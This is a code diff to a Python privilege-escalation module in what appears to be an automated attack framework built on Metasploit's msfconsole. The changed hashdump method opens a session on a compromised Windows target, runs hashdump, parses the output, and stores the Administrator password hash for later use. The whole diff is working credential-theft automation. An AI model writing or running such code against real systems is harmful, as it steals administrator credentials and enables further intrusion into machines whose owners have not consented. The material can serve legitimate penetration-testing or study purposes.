@@ -103,16 +103,35 @@ class PriviledgeEsc(object):
         # update user priviledges
         config.PRIVILEDGEESC.update_priviledes(target_name)
 
-    def hashdump(self, target_name, verbose=True ):
+    def hashdump(self, target_name, verbose=True):
         """
-        Display hashed Windows passwords
+        Collect administrator
         """
         target = config.TARGETS[target_name]
-        if not config.MSFCONSOLE.shell:
+        if not target.session_id:
             raise Exception("shell session with target not active")
             return
+        # open session with target
+        config.MSFCONSOLE.open_session(target_name)
+        # attempt to find administrator hash
         cmd = "hashdump"
-        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
+        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False, wait=3)
+        msf_reply = msf_reply.replace('\r','')
+        msf_reply = msf_reply.replace('\n','')
+        msf_reply = msf_reply.replace(':::','\n')
+
+        for line in msf_reply.splitlines():
+            if 'Administrator' in line.split(':'):
+                items = line.split(':')
+                hash = items[2] + ':' + items[3]
+                target.admin_user = 'Administrator'
+                target.admin_hash = hash
+                config.MSFCONSOLE.background_session(target_name)
+                print("[+] administrator password hash added:")
+                print("    " + hash)
+                return
+        config.MSFCONSOLE.background_session(target_name)
+        print("[-] unable to collect administrator password hash")
 
 
 
